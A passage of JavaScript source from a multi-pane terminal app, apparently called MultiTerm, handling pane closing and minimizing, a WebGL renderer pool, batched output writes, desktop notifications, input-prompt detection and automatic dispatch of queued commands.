  log.info("terminal", `Terminal closed: ${terminal.titleInput.value}`, { id });
  orphanTerminalArtifacts(terminal, "terminal closed");
  disposeTerminal(terminal);

  if (state.primaryId === id) {
    state.primaryId = null;
    const nextPrimary = state.terminals.has(state.activeId)
      ? state.activeId
      : firstVisibleTerminalId();
    if (nextPrimary) setPrimaryTerminal(nextPrimary);
  }

  if (state.activeId === id) {
    const next = terminalsOnActivePage()[0]?.id || state.terminals.keys().next().value;
    state.activeId = null;
    if (next) setActiveTerminal(next);
  }

  rebalanceWebglRenderers();
  applyZoom();
  saveManualLayouts();
  renderPager();
  forgetTerminalPages([id]);
  updateTerminalActions();
  saveSessionSnapshot();
  return true;
}

function closeAllTerminals() {
  if (state.terminals.size === 0) return true;

  if (!sendBridge({ type: "killAll" })) {
    setBridgeStatus("Bridge unavailable; sessions still running", "offline");
    log.warn("terminal", "Cannot close all; bridge unavailable");
    updateTerminalActions();
    return false;
  }

  log.info("terminal", `Closing all terminals (${state.terminals.size})`);
  const closedIds = [...state.terminals.keys()];
  for (const terminal of [...state.terminals.values()]) {
    orphanTerminalArtifacts(terminal, "all terminals closed");
    disposeTerminal(terminal);
  }

  state.activeId = null;
  state.primaryId = null;
  saveManualLayouts();
  renderPager();
  forgetTerminalPages(closedIds);
  updateTerminalActions();
  saveSessionSnapshot();
  return true;
}

function disposeTerminal(terminal) {
  const { id } = terminal;
  if (terminalNotificationFlyoutId === id) closeTerminalNotificationFlyout();
  if (state.snap?.id === id) {
    state.snap = null;
  }
  if (state.zoomedId === id) {
    state.zoomedId = null;
  }
  removeTerminalLinksForSession(id);
  removeTerminalAnalyticsRecord(terminal);
  window.clearTimeout(terminal.activityTimer);
  window.clearTimeout(terminal.silenceTimer);
  window.clearTimeout(terminal.promptTimer);
  window.clearTimeout(terminal.autoQueueTimer);
  terminal.autoQueueTimer = 0;
  window.clearTimeout(terminal.handoffScanTimer);
  window.clearTimeout(terminal.handoffDeliveryTimer);
  terminal.handoffScanTimer = 0;
  terminal.handoffDeliveryTimer = 0;
  window.clearTimeout(terminal.fontZoomIndicatorTimer);
  window.clearTimeout(terminal.webglRecoveryHandle);
  terminal.webglRecoveryHandle = 0;
  cancelTerminalOutputFlush(terminal);
  terminal.pendingOutput = [];
  terminal.pendingOutputBytes = 0;
  terminal.observer.disconnect();
  // The WebGL addon can throw during Terminal.dispose() teardown (it dereferences
  // render state that xterm may already have torn down). Dispose it explicitly
  // first, and guard term.dispose() too, so a renderer teardown error can never
  // abort a close-all loop and strand sessions.
  try {
    terminal.webglAddon?.dispose();
  } catch {
    /* GL context already gone */
  }
  terminal.webglAddon = null;
  try {
    terminal.term.dispose();
  } catch {
    /* renderer teardown raced disposal; the pane is removed below regardless */
  }
  terminal.pane.remove();
  state.terminals.delete(id);
  delete state.manualLayouts[id];
  updateMinimizedDock();
}

function minimizeTerminal(id) {
  const terminal = state.terminals.get(id);
  if (!terminal || terminal.minimized) return;

  terminal.minimized = true;
  terminal.pane.classList.add("is-minimized");
  scheduleTerminalConnections();
  rebalanceWebglRenderers();
  log.info("terminal", `Terminal minimized: ${terminal.titleInput.value}`, { id });
  if (state.snap?.id === id) {
    clearSnapLayout(false);
  }
  // A maximized pane that gets minimized would otherwise leave the stage empty:
  // every other pane stays hidden behind the zoom while this one is gone.
  if (state.zoomedId === id) {
    state.zoomedId = null;
    applyZoom();
  }

  if (state.activeId === id) {
    state.activeId = null;
    const next = firstVisibleTerminalId();
    if (next) setActiveTerminal(next);
  }
  if (state.primaryId === id) {
    state.primaryId = null;
    const nextPrimary = firstVisibleTerminalId();
    if (nextPrimary) setPrimaryTerminal(nextPrimary);
  }

  updateMinimizedDock();
  renderPager();
  updateTerminalActions();
  saveSessionSnapshot();
}

function restoreTerminal(id) {
  const terminal = state.terminals.get(id);
  if (!terminal || !terminal.minimized) return;

  // A minimized pane on another page is still is-page-hidden, so clearing
  // is-minimized alone would leave it invisible. Bring its page forward first so a
  // restore always puts the pane back on screen, whichever dock scope is active.
  if (terminal.pageId !== state.activePageId) {
    setActivePage(terminal.pageId, { focus: false });
  }

  terminal.minimized = false;
  terminal.pane.classList.remove("is-minimized");
  scheduleTerminalConnections();
  log.info("terminal", `Terminal restored: ${terminal.titleInput.value}`, { id });
  updateMinimizedDock();
  renderPager();
  updateTerminalActions();
  setActiveTerminal(id);
  applyManualLayout(terminal, ensureManualLayout(id));
  revealTerminal(terminal);
  scheduleFit(terminal);
  saveSessionSnapshot();
}

function restoreAllTerminals() {
  for (const terminal of [...state.terminals.values()]) {
    if (terminal.minimized) restoreTerminal(terminal.id);
  }
}

function firstVisibleTerminalId() {
  for (const terminal of terminalsOnActivePage()) {
    if (!terminal.minimized) return terminal.id;
  }
  return null;
}

function countVisibleTerminals() {
  let visible = 0;
  for (const terminal of terminalsOnActivePage()) {
    if (!terminal.minimized) visible += 1;
  }
  return visible;
}

// The dock has two scopes (a persisted, user-flippable setting):
//   "page"   – only the active page's minimized terminals (pages stay self-contained)
//   "global" – every minimized terminal, wherever it lives (a cross-page tray)
function minimizedScope() {
  return state.settings.minimizedScope === "global" ? "global" : "page";
}

function setMinimizedScope(scope) {
  const next = scope === "global" ? "global" : "page";
  if (minimizedScope() === next) return;
  state.settings.minimizedScope = next;
  saveSettings();
  updateMinimizedDock();
  toast(next === "global" ? "Minimized: showing all pages" : "Minimized: showing this page only", "info", 1600);
}

function updateMinimizedDock() {
  const dock = elements.minimizedDock;
  if (!dock) return;
  // Never clobber an in-progress rename; the input commits on blur.
  if (dock.querySelector(".min-chip-rename")) return;

  const scope = minimizedScope();
  const allMinimized = [...state.terminals.values()].filter((terminal) => terminal.minimized);
  const scoped = scope === "global"
    ? allMinimized
    : allMinimized.filter((terminal) => terminal.pageId === state.activePageId);

  dock.textContent = "";
  dock.hidden = allMinimized.length === 0;
  if (dock.hidden) return;

  // Leading scope toggle, so the control travels with the dock and is reachable even
  // when this page has nothing parked but another page does.
  const toggle = document.createElement("button");
  toggle.type = "button";
  toggle.className = "min-dock-toggle";
  const isGlobal = scope === "global";
  toggle.dataset.scope = scope;
  toggle.title = isGlobal
    ? "Showing minimized terminals from all pages — click to show only this page"
    : "Showing minimized terminals on this page — click to show all pages";
  toggle.setAttribute("aria-label", toggle.title);
  toggle.innerHTML = `<i data-lucide="${isGlobal ? "layers" : "app-window"}"></i><span class="min-dock-toggle-label"></span>`;
  toggle.querySelector(".min-dock-toggle-label").textContent = isGlobal ? "All pages" : "This page";
  toggle.addEventListener("click", () => setMinimizedScope(isGlobal ? "page" : "global"));
  dock.append(toggle);

  // In page scope, tell the user about terminals parked on other pages so they know
  // to flip the toggle (or click the page tab's parked badge) to reach them.
  if (scope === "page" && scoped.length < allMinimized.length) {
    const remaining = allMinimized.length - scoped.length;
    const hint = document.createElement("button");
    hint.type = "button";
    hint.className = "min-chip-hint";
    hint.title = "Show minimized terminals from all pages";
    hint.textContent = `+${remaining} on other page${remaining === 1 ? "" : "s"}`;
    hint.addEventListener("click", () => setMinimizedScope("global"));
    dock.append(hint);
  }

  for (const terminal of scoped) {
    const title = terminal.titleInput.value || "PowerShell";
    const chip = document.createElement("button");
    chip.type = "button";
    chip.className = "min-chip";
    chip.dataset.id = terminal.id;
    chip.title = `Restore ${title} (right-click for options)`;
    chip.setAttribute("aria-label", `Restore ${title}`);
    if (terminal.color) {
      chip.classList.add("has-color");
      chip.style.setProperty("--pane-accent", terminal.color);
    }
    chip.innerHTML = '<span class="min-chip-dot" aria-hidden="true"></span><span class="min-chip-label"></span><span class="min-chip-page" hidden></span><i data-lucide="chevron-up"></i>';
    chip.querySelector(".min-chip-label").textContent = title;

    // In global scope the chips mix pages, so name each one's page to keep it legible.
    if (scope === "global") {
      const pageTag = chip.querySelector(".min-chip-page");
      pageTag.textContent = pageName(terminal.pageId);
      pageTag.hidden = false;
    }

    chip.addEventListener("click", () => restoreTerminal(terminal.id));
    chip.addEventListener("contextmenu", (event) => {
      event.preventDefault();
      event.stopPropagation();
      showMinChipMenu(event.clientX, event.clientY, terminal, chip);
    });
    dock.append(chip);
  }

  refreshIcons();
}

// Rename a terminal from its minimized chip, since its title input is off-screen
// while parked. Mirrors the pane title's commit path so search stays in sync.
function startMinChipRename(chip, terminal) {
  const label = chip.querySelector(".min-chip-label");
  if (!label || chip.querySelector(".min-chip-rename")) return;

  const input = document.createElement("input");
  input.className = "min-chip-rename";
  input.type = "text";
  input.value = terminal.titleInput.value;
  input.spellcheck = false;
  label.replaceWith(input);
  input.focus();
  input.select();

  let settled = false;
  const finish = (commit) => {
    if (settled) return;
    settled = true;
    const name = input.value.trim() || "PowerShell";
    // Drop the input before re-rendering so updateMinimizedDock's "rename in
    // progress" guard doesn't skip its own commit re-render.
    input.remove();
    if (commit) {
      commitTerminalTitle(terminal, name);
    }
    updateMinimizedDock();
  };
  input.addEventListener("click", (event) => event.stopPropagation());
  input.addEventListener("keydown", (event) => {
    event.stopPropagation();
    if (event.key === "Enter") {
      event.preventDefault();
      finish(true);
    } else if (event.key === "Escape") {
      event.preventDefault();
      finish(false);
    }
  });
  input.addEventListener("blur", () => finish(true));
}

function showMinChipMenu(x, y, terminal, chip) {
  renderContextMenu([
    { label: "Restore", icon: "chevron-up", run: () => restoreTerminal(terminal.id) },
    { label: "Rename\u2026", icon: "pencil", run: () => startMinChipRename(chip, terminal) },
    { separator: true },
    { label: "Close", hint: "Ctrl+Shift+W", icon: "x", danger: true, run: () => removeTerminal(terminal.id) }
  ]);
  showBuiltContextMenu(x, y);
}

function moveTerminal(id, direction) {
  const terminal = state.terminals.get(id);
  if (!terminal) return;

  const sibling = direction < 0 ? terminal.pane.previousElementSibling : terminal.pane.nextElementSibling;
  if (!sibling) return;

  if (direction < 0) {
    elements.host.insertBefore(terminal.pane, sibling);
  } else {
    elements.host.insertBefore(sibling, terminal.pane);
  }

  scheduleFit(terminal);
  syncTerminalOrderToDom();
  saveSessionSnapshot();
}

function setActiveTerminal(id) {
  if (!state.terminals.has(id)) return;
  state.activeId = id;
  const primary = state.primaryId ? state.terminals.get(state.primaryId) : null;
  if (!primary || !isOnActivePage(primary)) {
    setPrimaryTerminal(id);
  }
  for (const terminal of state.terminals.values()) {
    const isActive = terminal.id === id;
    terminal.pane.classList.toggle("is-active", isActive);
    if (isActive) {
      window.clearTimeout(terminal.activityTimer);
      terminal.pane.classList.remove("has-activity");
    }
  }
  rebalanceWebglRenderers();
  updateStatusBar();
}

function setPrimaryTerminal(id) {
  if (!state.terminals.has(id)) return;
  state.primaryId = id;
  for (const terminal of state.terminals.values()) {
    terminal.pane.classList.toggle("is-primary", terminal.id === id);
  }
}

function setTerminalStatus(terminal, text, tone) {
  terminal.statusElement.textContent = text;
  terminal.statusElement.classList.toggle("is-live", tone === "live");
  terminal.statusElement.classList.toggle("is-dead", tone === "dead");
  refreshStatusPillTooltip(terminal);
  refreshTerminalSearchText(terminal);
  updateTerminalSearchVisibility(terminal);
}

/* ---------------- Session launch time --------------- */

// Both bridges stamp startedAt (ISO 8601) when they spawn the shell and repeat
// it in every session summary, so the launch time survives a reconnect or a page
// reload without the client having to remember anything.

function formatLaunchTimestamp(startedAt) {
  const started = Date.parse(startedAt);
  if (!Number.isFinite(started)) return "";
  // Seconds are kept: two shells launched moments apart are otherwise
  // indistinguishable, which is exactly when you go looking for this.
  return new Date(started).toLocaleString(undefined, { dateStyle: "medium", timeStyle: "medium" });
}

function formatUptime(startedAt, now = Date.now()) {
  const started = Date.parse(startedAt);
  if (!Number.isFinite(started)) return "";
  const seconds = Math.max(0, Math.round((now - started) / 1000));
  if (seconds < 60) return `${seconds}s`;
  const minutes = Math.floor(seconds / 60);
  if (minutes < 60) return `${minutes}m`;
  const hours = Math.floor(minutes / 60);
  if (hours < 24) return `${hours}h ${minutes % 60}m`;
  return `${Math.floor(hours / 24)}d ${hours % 24}h`;
}

// Recomputed on hover rather than written once, because the elapsed time in it
// goes stale the moment it is set.
function refreshStatusPillTooltip(terminal) {
  const launched = formatLaunchTimestamp(terminal.startedAt);
  if (!launched) {
    terminal.statusElement.removeAttribute("title");
    return;
  }

  const lines = [`Launched ${launched}`];
  if (terminal.status !== "exited" && terminal.status !== "error") {
    lines.push(`Up ${formatUptime(terminal.startedAt)}`);
  }
  lines.push("Right-click for details");
  terminal.statusElement.title = lines.join("\n");
}

// Browsers cap simultaneous WebGL contexts per GPU process (16 by default in
// Chrome/Electron) and force-lose the oldest context once the cap is exceeded.
// Past ~16 panes that became a rolling eviction cascade, which is the white,
// flickering behavior users reported.
//
// Keep a bounded pool below that stock cap. xterm's built-in renderer can replace
// an intentionally disposed WebGL addon, so the pool can follow the active and
// visible panes rather than belonging forever to the first panes created.
// Hardware-GPU measurements of a Copilot-style repaint stream showed WebGL using
// about 39% less renderer task time than the built-in renderer.
const WEBGL_MAX_CONTEXTS = 12;

function liveWebglRendererCount() {
  let count = 0;
  for (const terminal of state.terminals.values()) {
    if (terminal.webglAddon) count += 1;
  }
  return count;
}

function isWebglVisibleCandidate(terminal) {
  const hidden = terminal.minimized
    || terminal.pane.classList.contains("is-search-hidden")
    || !isOnActivePage(terminal);
  if (hidden) return false;
  const zoomed = effectiveZoomedId();
  return !zoomed || zoomed === terminal.id;
}

function preferredWebglTerminals() {
  const terminals = [...state.terminals.values()];
  terminals.sort((left, right) => {
    const leftVisible = isWebglVisibleCandidate(left);
    const rightVisible = isWebglVisibleCandidate(right);
    const leftRank = left.id === state.activeId && leftVisible ? 0 : leftVisible ? 1 : 2;
    const rightRank = right.id === state.activeId && rightVisible ? 0 : rightVisible ? 1 : 2;
    return leftRank - rightRank;
  });
  return terminals.slice(0, WEBGL_MAX_CONTEXTS);
}

function detachWebglRenderer(terminal) {
  const addon = terminal.webglAddon;
  if (!addon) return;
  terminal.webglAddon = null;
  try {
    addon.dispose();
  } catch {
    /* context already gone */
  }
  const core = terminal.term._core;
  if (core?._renderService && core._createRenderer) {
    // addon-webgl 0.19 contains the same fallback, but disposal can still leave
    // its disposed renderer registered. Restore the pinned core renderer explicitly.
    core._renderService.setRenderer(core._createRenderer());
    core._renderService.handleResize(terminal.term.cols, terminal.term.rows);
  }
  try {
    terminal.term.refresh(0, terminal.term.rows - 1);
  } catch {
    /* renderer not ready yet; a later resize/fit will refresh */
  }
}

function rebalanceWebglRenderers() {
  if (!window.WebglAddon?.WebglAddon) return;
  const preferred = new Set(preferredWebglTerminals());

  // Release lower-priority contexts first so every subsequent attachment stays
  // within the hard budget, even in a browser without our launcher flag.
  for (const terminal of state.terminals.values()) {
    if (terminal.webglAddon && !preferred.has(terminal)) {
      detachWebglRenderer(terminal);
    }
  }
  for (const terminal of preferred) {
    if (!terminal.webglAddon) attachWebglRenderer(terminal);
  }
}

// Attach the WebGL renderer to a terminal unless that would push us past the
// context budget. Returning null is a normal outcome, not a failure: the pane
// simply keeps xterm's DOM renderer. The other degradations land here too — addon
// script missing (offline/headless), or GPU blocklisted so construction throws.
//
// Recovery after a genuine context loss is still allowed through: the lost addon
// has already been cleared, so it no longer counts against the budget.
function attachWebglRenderer(terminal) {
  const WebglCtor = window.WebglAddon?.WebglAddon;
  if (!WebglCtor) return null;
  if (!terminal.webglAddon && liveWebglRendererCount() >= WEBGL_MAX_CONTEXTS) return null;
  const { term } = terminal;
  let webgl;
  try {
    webgl = new WebglCtor();
  } catch {
    return null;
  }
  webgl.onContextLoss(() => {
    if (terminal.webglAddon === webgl) {
      detachWebglRenderer(terminal);
    } else {
      try {
        webgl.dispose();
      } catch {
        /* already gone */
      }
    }
    scheduleWebglRecovery(terminal);
  });
  try {
    term.loadAddon(webgl);
  } catch {
    return null;
  }
  terminal.webglAddon = webgl;
  return webgl;
}

// Recreate the WebGL renderer shortly after a context loss. If losses keep
// recurring in a short window, back off before rebalancing the bounded pool.
function scheduleWebglRecovery(terminal) {
  if (terminal.webglRecoveryHandle) return;
  const now = performance.now();
  terminal.webglLossTimes = (terminal.webglLossTimes || []).filter((t) => now - t < 8000);
  terminal.webglLossTimes.push(now);
  const thrashing = terminal.webglLossTimes.length > 3;
  const delay = thrashing ? 1500 : 300;
  terminal.webglRecoveryHandle = window.setTimeout(() => {
    terminal.webglRecoveryHandle = 0;
    if (terminal.webglAddon || !state.terminals.has(terminal.id)) return;
    rebalanceWebglRenderers();
    try {
      terminal.term.refresh(0, terminal.term.rows - 1);
    } catch {
      /* renderer not ready yet; a later resize/fit will refresh */
    }
  }, delay);
}

// Live shell output can arrive as hundreds of tiny WebSocket messages per second.
// Instead of paying the full write pipeline (xterm write + search bookkeeping +
// activity/notification/prompt scheduling + scroll) per message, we queue the raw
// chunks and drain them once per animation frame. That collapses N messages/frame
// into a single term.write and a single side-effect pass, keeping the UI responsive.
//
// rAF stops entirely while the window is hidden or minimized, so a hidden window
// falls back to a timer and any pane whose backlog passes the configured ceiling
// drains immediately. Terminals therefore keep consuming output off-screen instead
// of hoarding a whole build transcript in JS and replaying it in one blocking
// write when the window comes back.
const HIDDEN_FLUSH_MS = 100;

function outputBacklogLimitBytes() {
  const kb = Number(state.settings.outputBacklogKb);
  const bounds = OUTPUT_BACKLOG_KB_BOUNDS;
  const clamped = Number.isFinite(kb) ? Math.min(bounds.max, Math.max(bounds.min, kb)) : bounds.fallback;
  return clamped * 1024;
}

function isOutputBacklogFull(terminal) {
  return terminal.pendingOutputBytes >= outputBacklogLimitBytes();
}

function isOutputFlushScheduled(terminal) {
  return Boolean(terminal.outputFlushHandle || terminal.outputFlushTimer);
}

function enqueueTerminalOutput(terminal, data) {
  terminal.pendingOutput.push(data);
  terminal.pendingOutputBytes += data.length;
  if (isOutputBacklogFull(terminal)) {
    flushTerminalOutput(terminal);
    return;
  }
  if (isOutputFlushScheduled(terminal)) return;
  if (document.hidden) {
    terminal.outputFlushTimer = window.setTimeout(() => flushTerminalOutput(terminal), HIDDEN_FLUSH_MS);
  } else {
    terminal.outputFlushHandle = window.requestAnimationFrame(() => flushTerminalOutput(terminal));
  }
}

function cancelTerminalOutputFlush(terminal) {
  if (terminal.outputFlushHandle) {
    window.cancelAnimationFrame(terminal.outputFlushHandle);
    terminal.outputFlushHandle = 0;
  }
  if (terminal.outputFlushTimer) {
    window.clearTimeout(terminal.outputFlushTimer);
    terminal.outputFlushTimer = 0;
  }
}

function flushTerminalOutput(terminal) {
  cancelTerminalOutputFlush(terminal);
  const chunks = terminal.pendingOutput;
  if (!chunks.length) return;
  terminal.pendingOutput = [];
  terminal.pendingOutputBytes = 0;
  const data = chunks.length === 1 ? chunks[0] : chunks.join("");
  writeTerminal(terminal, data);
}

// Going hidden cancels the pending frame, and coming back must not wait for the
// timer that replaced it — drain on every transition so no pane stalls.
function flushAllTerminalOutput() {
  for (const terminal of state.terminals.values()) {
    flushTerminalOutput(terminal);
  }
}

// Immediate, unbatched write. Coalesced live output funnels through here once per
// frame via flushTerminalOutput; status/banner lines (writelnTerminal) call it too.
function writeTerminal(terminal, data) {
  terminal.term.write(data);
  terminal.outputRevision += 1;
  if (terminal.autoQueueCompletionMarker) {
    terminal.autoQueueOutputEvidence = `${terminal.autoQueueOutputEvidence}${stripTerminalControlCodes(data)}`.slice(-32768);
  }
  appendTerminalSearchText(terminal, data);
  updateTerminalSearchVisibility(terminal);
  markActivity(terminal);
  handleOutputNotifications(terminal);
  scheduleInputPromptCheck(terminal);
  scheduleAutomaticQueueCheck(terminal);
  scheduleTerminalHandoffScan(terminal);
  scheduleTerminalHandoffDelivery(terminal);
  if (state.settings.scrollOnOutput) terminal.term.scrollToBottom();
}

// Desktop / toast notifications for background activity and idle (silence),
// inspired by Terminator's ActivityWatch and InactivityWatch plugins.
function handleOutputNotifications(terminal) {
  const now = performance.now();
  terminal.lastOutputAt = now;
  const isBackground = terminal.id !== state.activeId;
  const inStartupGrace = now - terminal.createdAt < 1500;

  if (terminalNotificationEnabled(terminal, "activity") && isBackground && !inStartupGrace) {
    if (!terminal.lastActivityNotify || now - terminal.lastActivityNotify > 8000) {
      terminal.lastActivityNotify = now;
      notifyDesktop(`Activity in ${terminal.titleInput.value || "terminal"}`, terminal);
    }
  }

  if (terminalNotificationEnabled(terminal, "idle") && !inStartupGrace) {
    terminal.hadOutput = true;
    window.clearTimeout(terminal.silenceTimer);
    const seconds = Math.max(2, Number(state.settings.silenceSeconds) || 10);
    terminal.silenceTimer = window.setTimeout(() => {
      if (!terminalNotificationEnabled(terminal, "idle")) return;
      if (!terminal.hadOutput) return;
      terminal.hadOutput = false;
      if (terminal.id !== state.activeId || document.hidden) {
        notifyDesktop(`${terminal.titleInput.value || "Terminal"} is idle`, terminal);
      }
    }, seconds * 1000);
  }
}

function focusAppWindow() {
  try {
    window.multiterm?.focusWindow?.();
  } catch { /* not running under Electron */ }
  window.focus();
}

function focusNotifiedTerminal(terminal) {
  focusAppWindow();
  if (!terminal || !state.terminals.has(terminal.id)) return;
  if (terminal.pageId !== state.activePageId) setActivePage(terminal.pageId, { focusTerm: false });
  setActiveTerminal(terminal.id);
  terminal.term.focus();
}

function notifyDesktop(body, terminal = null) {
  toast(body, "info", 2600);
  if (!("Notification" in window)) return;
  if (Notification.permission === "granted") {
    try {
      const notification = new Notification("MultiTerm", {
        body,
        tag: terminal ? `multiterm-${terminal.id}` : undefined
      });
      notification.onclick = () => {
        focusNotifiedTerminal(terminal);
        notification.close?.();
      };
    } catch {
      /* ignore */
    }
  } else if (Notification.permission === "default") {
    Notification.requestPermission();
  }
}

function effectiveScrollback() {
  if (state.settings.scrollbackInfinite) return 1000000;
  const lines = Number(state.settings.scrollback);
  return Number.isFinite(lines) && lines > 0 ? Math.min(Math.round(lines), 1000000) : 20000;
}

/* ---------------- Awaiting-input detection --------------- */

// The pattern-matching heuristics live in a shared, DOM-free module
// (input-detection.js) so they can be unit-tested in isolation. The renderer's
// job here is only to decide *which* line to inspect and pass the caret context.
const promptDetector = (typeof window !== "undefined" && window.InputPromptDetector) || {
  isCopilotPromptReady: () => false,
  isCopilotTui: () => false,
  isShellPrompt: () => false,
  looksLikeInputPrompt: () => false
};

const AUTO_QUEUE_SETTLE_MS = 550;
const TERMINAL_PASTE_SETTLE_MS = 80;
const COPILOT_TUI_ENTER = "\x1b[13u";

function activeBufferLines(terminal) {
  const buffer = terminal?.term?.buffer?.active;
  if (!buffer) return [];
  const lines = [];
  const first = buffer.type === "alternate" ? 0 : Math.max(0, buffer.length - terminal.term.rows - 4);
  for (let row = first; row < buffer.length; row += 1) {
    lines.push(readBufferLine(buffer, row));
  }
  return lines;
}

function readLogicalCursorLine(buffer, cursorRow) {
  let first = cursorRow;
  while (first > 0 && buffer.getLine(first)?.isWrapped) first -= 1;
  let text = "";
  for (let row = first; row <= cursorRow; row += 1) {
    text += buffer.getLine(row)?.translateToString(true) || "";
  }
  return text.replace(/\s+$/, "");
}

function terminalExecutionReadiness(terminal) {
  const buffer = terminal?.term?.buffer?.active;
  if (!buffer || terminal.status !== "live") return { mode: "none", ready: false };
  const lines = activeBufferLines(terminal);
  if (promptDetector.isCopilotTui(lines) || promptDetector.isCopilotPromptReady(lines, true)) {
    terminal.copilotTuiDetected = true;
  }

  const cursorRow = buffer.baseY + buffer.cursorY;
  const physicalLine = readBufferLine(buffer, cursorRow);
  const logicalLine = readLogicalCursorLine(buffer, cursorRow);
  const shellReady = buffer.type !== "alternate"
    && Boolean(logicalLine)
    && buffer.cursorX >= physicalLine.length
    && promptDetector.isShellPrompt(logicalLine);
  if (terminal.copilotTuiDetected) {
    if (shellReady) {
      terminal.copilotTuiDetected = false;
    } else {
      return {
        mode: "copilot",
        ready: promptDetector.isCopilotPromptReady(lines, true)
      };
    }
  }
  if (buffer.type === "alternate") return { mode: "alternate", ready: false };
  return {
    mode: "shell",
    ready: shellReady
  };
}

function terminalEnterSequence(terminal) {
  const lines = activeBufferLines(terminal);
  return terminal?.copilotTuiDetected
    || promptDetector.isCopilotTui(lines)
    || promptDetector.isCopilotPromptReady(lines, true)
    ? COPILOT_TUI_ENTER
    : "\r";
}

function pasteIntoSpecificTerminal(terminal, text) {
  if (!terminal || !text || !state.socketReady) return false;
  terminal.targetedPaste = true;
  terminal.targetedPasteObserved = false;
  terminal.targetedPasteSent = true;
  try {
    terminal.term.paste(text);
    return terminal.targetedPasteObserved && terminal.targetedPasteSent;
  } finally {
    terminal.targetedPaste = false;
    terminal.targetedPasteObserved = false;
    terminal.targetedPasteSent = false;
  }
}

function capturePasteForSpecificTerminal(terminal, text) {
  if (!terminal || !text) return "";
  terminal.targetedPasteCapture = [];
  try {
    terminal.term.paste(text);
    return terminal.targetedPasteCapture.join("");
  } finally {
    terminal.targetedPasteCapture = null;
  }
}

function scheduleTerminalEnter(terminal, { sequence = null, onComplete = null } = {}) {
  const terminalId = terminal?.id;
  window.setTimeout(() => {
    const liveTerminal = state.terminals.get(terminalId);
    const sent = Boolean(liveTerminal)
      && sendBridge({ type: "input", id: terminalId, data: sequence || terminalEnterSequence(liveTerminal) });
    if (typeof onComplete === "function") onComplete(sent, liveTerminal || null);
  }, TERMINAL_PASTE_SETTLE_MS);
}

function automaticQueueItem(terminal) {
  const queue = state.terminalArtifacts.terminals[terminal.id]?.queue || [];
  return queue.find((item) => item.runWhenReady === true) || null;
}

function normalizeAutomaticQueueEvidence(value) {
  return String(value || "").replace(/\s+/g, " ").trim().toLocaleLowerCase();
}

function scheduleAutomaticQueueCheck(terminal, delay = AUTO_QUEUE_SETTLE_MS) {
  window.clearTimeout(terminal?.autoQueueTimer);
  if (!terminal || terminal.status !== "live" || !automaticQueueItem(terminal)) return;
  terminal.autoQueueTimer = window.setTimeout(() => {
    terminal.autoQueueTimer = 0;
    dispatchAutomaticQueueItem(terminal);
  }, delay);
}

function dispatchAutomaticQueueItem(terminal) {
  if (!terminal || terminal.autoQueueDispatching || terminal.status !== "live") return false;
  if (terminal.outputRevision < terminal.autoQueueRequiredRevision) return false;
  if (terminal.autoQueueCompletionMarker) {
    const evidence = normalizeAutomaticQueueEvidence(terminal.autoQueueOutputEvidence);
    if (!evidence.includes(terminal.autoQueueCompletionMarker)) return false;
  }
  const readiness = terminalExecutionReadiness(terminal);
  if (!readiness.ready) return false;

  const record = state.terminalArtifacts.terminals[terminal.id];
  const item = automaticQueueItem(terminal);
  if (!record || !item) return false;
  const command = safeTerminalCommand(item.command);
  if (!command) {
    record.queue.splice(record.queue.indexOf(item), 1);
    saveTerminalArtifacts();
    scheduleAutomaticQueueCheck(terminal, 0);
    return false;
  }
  if (!state.socketReady) return false;

  terminal.autoQueueDispatching = true;
  terminal.autoQueueRequiredRevision = terminal.outputRevision + 1;
  terminal.autoQueueCompletionMarker = normalizeAutomaticQueueEvidence(command).slice(0, 160);
  terminal.autoQueueOutputEvidence = "";
  const enterSequence = readiness.mode === "copilot" ? COPILOT_TUI_ENTER : "\r";
  if (!pasteIntoSpecificTerminal(terminal, command)) {
    terminal.autoQueueDispatching = false;
    terminal.autoQueueRequiredRevision = 0;
    terminal.autoQueueCompletionMarker = "";
    terminal.autoQueueOutputEvidence = "";
    return false;
  }

  scheduleTerminalEnter(terminal, {
    sequence: enterSequence,
    onComplete: (sent, liveTerminal) => {
      terminal.autoQueueDispatching = false;
      if (!sent || !liveTerminal) {
        terminal.autoQueueRequiredRevision = 0;
        terminal.autoQueueCompletionMarker = "";
        terminal.autoQueueOutputEvidence = "";
        toast("Bridge unavailable; the queued command was not executed.", "error", 2600);
        return;
      }
      const liveRecord = state.terminalArtifacts.terminals[terminal.id];
      const index = liveRecord?.queue.findIndex((entry) => entry.id === item.id) ?? -1;
      if (index >= 0) liveRecord.queue.splice(index, 1);
      saveTerminalArtifacts();
      log.info("queue", `Executed queued command in ${terminal.titleInput.value || "terminal"}`, { id: terminal.id });
    }
  });
  return true;
}

// Heuristic: after output settles, inspect the line the cursor is parked on.
// A program blocked on input leaves its prompt there; an idle shell leaves its
// own prompt (excluded by the detector's shell-prompt veto). If the line reads
// like a question or choice, flag the pane so it stands out.
function scheduleInputPromptCheck(terminal) {
  window.clearTimeout(terminal.promptTimer);
  if (!state.settings.highlightInputPrompts) {
    setAwaitingInput(terminal, false);
    return;
  }
  terminal.promptTimer = window.setTimeout(() => evaluateInputPrompt(terminal), 500);
}

function evaluateInputPrompt(terminal) {
  if (!state.settings.highlightInputPrompts || terminal.status === "exited") {
    setAwaitingInput(terminal, false);
    return;
  }
  const buffer = terminal.term.buffer.active;
  if (!buffer || buffer.type === "alternate") {
    setAwaitingInput(terminal, false);
    return;
  }
  const cursorRow = buffer.baseY + buffer.cursorY;
  let row = cursorRow;
  let line = readBufferLine(buffer, row);
  // A prompt sometimes leaves the caret on a fresh empty line just below the
  // question (e.g. after a trailing newline). Walk back a couple of rows to the
  // nearest non-empty line so we inspect the actual prompt text.
  for (let probe = cursorRow - 1; !line && probe >= Math.max(0, cursorRow - 2); probe -= 1) {
    row = probe;
    line = readBufferLine(buffer, probe);
  }
  // The caret sits at the end of the prompt when a program is genuinely blocked
  // waiting for the user; if it's mid-line the program is likely still drawing.
  const cursorAtLineEnd = row !== cursorRow || buffer.cursorX >= line.length;
  const singleFlag = promptDetector.looksLikeInputPrompt(line, { cursorAtLineEnd });
  // Many interactive prompts (an agent asking a "Question" with a numbered list,
  // a wizard menu, …) span several lines, so no single parked line is enough.
  // Scan a small window of the most recent lines together as a fallback.
  let blockFlag = false;
  if (!singleFlag && typeof promptDetector.looksLikeInputPromptBlock === "function") {
    const window = readBufferWindow(buffer, cursorRow, PROMPT_WINDOW_ROWS);
    blockFlag = promptDetector.looksLikeInputPromptBlock(window, { cursorAtLineEnd });
  }
  setAwaitingInput(terminal, singleFlag || blockFlag);
}

// How many rows above the caret the multi-line block scanner considers. Large
// enough to span a "Question" header + an enumerated list, small enough that a
